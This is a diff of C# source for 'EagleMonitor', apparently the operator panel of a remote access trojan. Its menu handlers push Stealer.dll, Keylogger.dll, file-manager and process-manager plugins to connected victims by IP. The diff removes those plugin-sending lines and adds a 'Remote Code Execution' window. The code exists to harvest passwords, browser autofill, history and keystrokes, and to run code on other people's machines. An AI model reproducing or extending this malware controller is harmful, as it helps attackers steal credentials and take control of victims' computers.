@@ -168,10 +168,6 @@ namespace EagleMonitor
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                PasswordsPacket passwordsPacket = new PasswordsPacket
-                {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
-                };
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].passwordsForm != null)
@@ -195,7 +191,6 @@ namespace EagleMonitor
                     ClientHandler.ClientHandlersList[IP].passwordsForm.label1.Text = "Passwords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].passwordsForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].passwordsForm.loadingCircle1.Active = true;
-                    ClientHandler.ClientHandlersList[IP].SendPacket(passwordsPacket);
                 }
             }
         }
@@ -205,10 +200,6 @@ namespace EagleMonitor
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                AutofillPacket autofillPacket = new AutofillPacket
-                {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
-                };
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].autofillForm != null)
@@ -232,7 +223,6 @@ namespace EagleMonitor
                     ClientHandler.ClientHandlersList[IP].autofillForm.label1.Text = "Autofill Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].autofillForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].autofillForm.loadingCircle1.Active = true;
-                    ClientHandler.ClientHandlersList[IP].SendPacket(autofillPacket);
                 }
             }
         }
@@ -242,10 +232,6 @@ namespace EagleMonitor
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                KeywordsPacket keywordsPacket = new KeywordsPacket
-                {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
-                };
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].keywordsForm != null)
@@ -269,7 +255,6 @@ namespace EagleMonitor
                     ClientHandler.ClientHandlersList[IP].keywordsForm.label1.Text = "Keywords Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].keywordsForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].keywordsForm.loadingCircle1.Active = true;
-                    ClientHandler.ClientHandlersList[IP].SendPacket(keywordsPacket);
                 }
             }
         }
@@ -279,8 +264,6 @@ namespace EagleMonitor
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                DiskPacket diskPacket = new DiskPacket();
-                diskPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\FileManager.dll"), 1);
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].fileManagerForm != null)
@@ -304,7 +287,6 @@ namespace EagleMonitor
                     ClientHandler.ClientHandlersList[IP].fileManagerForm.label1.Text = "File Manager: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].fileManagerForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].fileManagerForm.loadingCircle1.Active = true;
-                    ClientHandler.ClientHandlersList[IP].SendPacket(diskPacket);
                 }
             }
         }
@@ -314,8 +296,6 @@ namespace EagleMonitor
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                ProcessManagerPacket processManagerPacket = new ProcessManagerPacket();
-                processManagerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\ProcessManager.dll"), 1);
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].processManagerForm != null)
@@ -341,7 +321,6 @@ namespace EagleMonitor
                     ClientHandler.ClientHandlersList[IP].processManagerForm.label1.Text = "Process Manager: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].processManagerForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].processManagerForm.loadingCircle1.Active = true;
-                    ClientHandler.ClientHandlersList[IP].SendPacket(processManagerPacket);
                 }
             }
         }
@@ -351,8 +330,6 @@ namespace EagleMonitor
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                KeylogPacket keylogPacket = new KeylogPacket();
-                keylogPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Keylogger.dll"), 1);
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].keyloggerForm != null)
@@ -375,18 +352,38 @@ namespace EagleMonitor
                 {
                     ClientHandler.ClientHandlersList[IP].keyloggerForm.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].IP;
                     ClientHandler.ClientHandlersList[IP].keyloggerForm.label1.Text = "Keylogger: " + ClientHandler.ClientHandlersList[IP].fullName;
-                    ClientHandler.ClientHandlersList[IP].SendPacket(keylogPacket);
                 }
             }
         }
 
-        private void closeStripMenuItem_Click(object sender, EventArgs e)
+        private void remoteCodeExecutionToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            ClosePacket closePacket = new ClosePacket();
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                ClientHandler.ClientHandlersList[IP].SendPacket(closePacket);
+                try
+                {
+                    if (ClientHandler.ClientHandlersList[IP].remoteCodeForm != null)
+                    {
+                        ClientHandler.ClientHandlersList[IP].remoteCodeForm.Show();
+                    }
+                    else
+                    {
+                        ClientHandler.ClientHandlersList[IP].remoteCodeForm = new RemoteCodeForm(ClientHandler.ClientHandlersList[IP]);
+                        ClientHandler.ClientHandlersList[IP].remoteCodeForm.Show();
+                    }
+
+                }
+                catch (Exception)
+                {
+                    ClientHandler.ClientHandlersList[IP].remoteCodeForm = new RemoteCodeForm(ClientHandler.ClientHandlersList[IP]);
+                    ClientHandler.ClientHandlersList[IP].remoteCodeForm.Show();
+                }
+                finally
+                {
+                    ClientHandler.ClientHandlersList[IP].remoteCodeForm.Text = "Remote Code Execution: " + ClientHandler.ClientHandlersList[IP].IP;
+                    ClientHandler.ClientHandlersList[IP].remoteCodeForm.label3.Text = "Remote Code Execution: " + ClientHandler.ClientHandlersList[IP].fullName;
+                }
             }
         }
 
@@ -395,10 +392,6 @@ namespace EagleMonitor
             foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
-                HistoryPacket historyPacket = new HistoryPacket
-                {
-                    plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
-                };
                 try
                 {
                     if (ClientHandler.ClientHandlersList[IP].historyForm != null)
@@ -422,7 +415,6 @@ namespace EagleMonitor
                     ClientHandler.ClientHandlersList[IP].historyForm.label1.Text = "History Recovery: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].historyForm.loadingCircle1.Visible = true;
                     ClientHandler.ClientHandlersList[IP].historyForm.loadingCircle1.Active = true;
-                    ClientHandler.ClientHandlersList[IP].SendPacket(historyPacket);
                 }
             }
         }
@@ -481,7 +473,8 @@ namespace EagleMonitor
                 }
                 finally
                 {
-                    ClientHandler.ClientHandlersList[IP].chatForm.Text = "Chat: " + ClientHandler.ClientHandlersList[IP].fullName;     
+                    ClientHandler.ClientHandlersList[IP].chatForm.Text = "Chat: " + ClientHandler.ClientHandlersList[IP].fullName;
+                    ClientHandler.ClientHandlersList[IP].chatForm.label3.Text = "Chat: " + ClientHandler.ClientHandlersList[IP].fullName;
                 }
             }
         }
@@ -561,6 +554,26 @@ namespace EagleMonitor
             {
                 string IP = dataGridViewRow.Cells[2].Value.ToString();
                 ClientHandler.ClientHandlersList[IP].SendPacket(powerPacket);
+            }
+        }
+
+        private void closeStripMenuItem_Click(object sender, EventArgs e)
+        {
+            ClosePacket closePacket = new ClosePacket();
+            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
+            {
+                string IP = dataGridViewRow.Cells[2].Value.ToString();
+                ClientHandler.ClientHandlersList[IP].SendPacket(closePacket);
+            }
+        }
+
+        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            UninstallPacket uninstallPacket = new UninstallPacket();
+            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
+            {
+                string IP = dataGridViewRow.Cells[2].Value.ToString();
+                ClientHandler.ClientHandlersList[IP].SendPacket(uninstallPacket);
             }
         }
 
@@ -728,15 +741,6 @@ namespace EagleMonitor
                     ClientHandler.ClientHandlersList[IP].informationForm.Text = "Information: " + ClientHandler.ClientHandlersList[IP].fullName;
                     ClientHandler.ClientHandlersList[IP].informationForm.label5.Text = "Information: " + ClientHandler.ClientHandlersList[IP].fullName;
                 }
-            }
-        }
-        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            UninstallPacket uninstallPacket = new UninstallPacket();
-            foreach (DataGridViewRow dataGridViewRow in dataGridView1.SelectedRows)
-            {
-                string IP = dataGridViewRow.Cells[2].Value.ToString();
-                ClientHandler.ClientHandlersList[IP].SendPacket(uninstallPacket);
             }
         }
 
